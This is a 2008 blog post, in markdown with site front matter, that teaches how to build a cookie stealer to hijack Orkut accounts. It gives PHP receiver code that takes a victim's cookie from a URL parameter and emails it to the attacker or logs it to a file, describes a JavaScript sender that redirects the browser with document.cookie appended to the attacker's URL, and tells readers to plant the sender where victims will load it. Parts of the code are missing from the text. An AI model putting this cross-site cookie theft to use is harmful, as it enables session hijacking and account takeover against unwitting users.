---
# http://learn.getgrav.org/content/headers
title: How to make cookies and hack Orkut accounts
slug: how-to-make-cookies-and-hack-orkut-accounts
# menu: How to make cookies and hack Orkut accounts
date: 29-05-2008
published: true
publish_date: 29-05-2008
# unpublish_date: 29-05-2008
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - orkut
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [orkut]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

[  
](http://learn-how-to-hack3.blogspot.com/2007/10/how-to-make-cookies-and-hack-orkut.html)[](http://learn-how-to-hack3.blogspot.com/2007/10/how-to-make-cookies-and-hack-orkut.html)

How to Make a Cookie Stealer

Introduction

Exactly how does a cookie stealer work, anyway? There are two components in a cookie stealer: the sender and the receiver.

The sender can take many forms. In essense, it’s just a link to the receiver with the cookie somehow attached. It can sometimes be difficult to find a way to implement the sender.

The receiver, as the name suggests, is a device which receives the cookie from the sender. It can also take several forms, but the most common is that of a PHP document, most commonly found residing on some obscure webserver.

Step One: The Code

Coding a receiver is the part with which most newbies struggle. Only two things are

needed to make a receiver: a webhost which supports PHP, and Notepad (see the end of the text for a link to some free PHP hosts).

As I said in the introduction, the receiver’s job is to receive the cookie from the sender. The easiest way to send information to a PHP document is by using the HTTP GET method, which appends information to the end of the URL as a parameter (for example, “page.php?arg1=value”). PHP can access GET information by accessing $HTTP\_GET\_VARS[x], where x is a string containing the name of the argument.

Once the receiver has the cookie, it needs a way to get that cookie to you. The two most common ways of doing this are sending it in an email, and storing it in a log. We’ll look at both.

First, let’s look at sending it in an email. Here is what such a beast would look like (functioning code):

$cookie = $HTTP\_GET\_VARS[“cookie”]; // line 2  
mail(“me@mydomain.com”, “Cookie stealer report”, $cookie); // line 3  
?> // line 4

Line 1 tells the server that this is indeed a PHP document.  
Line 2 takes the cookie from the URL (“stealer.php?cookie=x”) and stores it in the variable $cookie.  
Line 3 accesses PHP’s mail() function and sends the cookie to “me@mydomain.com” with the subject of “Cookie stealer report”.  
Line 4 tells the server that the PHP code ends here.

Next, we’ll look at my preferred method, which is storing the cookie in a logfile. (functioning code)

$cookie = $HTTP\_GET\_VARS[“cookie”]; // line 2  
$file = fopen(‘cookielog.txt’, ‘a’); // line 3  
fwrite($file, $cookie . “nn”); // line 4  
?> // line 5

Lines 1 and 2 are the same as before.  
Line 3 opens the file “cookielog.txt” for writing, then stores the file’s handle in $file.  
Line 4 writes the cookie to the file which has its handle in $file. The period between $cookie and “nn” combines the two strings as one. The “nn” acts as a double line-break, making it easier for us to sift through the log file.  
Line 5 is the same as before.

Step Two: Implementing the Stealer

The hardest part (usually) of making a cookie stealer is finding a way to use the sender. The simplest method requires use of HTML and JavaScript, so you have to be sure that your environment supports those two. Here is an example of a sender.

// Line 3

Line 1 tells the browser that the following chunk of code is to be interpereted as JavaScript.  
Line 2 adds document.cookie to the end of the URL, which is then stored in document.location. Whenever document.location is changed, the browser is redirected to that URL.  
Line 3 tells the browser to stop reading the code as JavaScript (return to HTML).

There are two main ways of implementing the sender:

You can plant your sender where the victim will view it as an HTML document with his browser. In order to do that, you have to find some way to actually post the code somewhere on the site.

Go to our new site- shankee.com
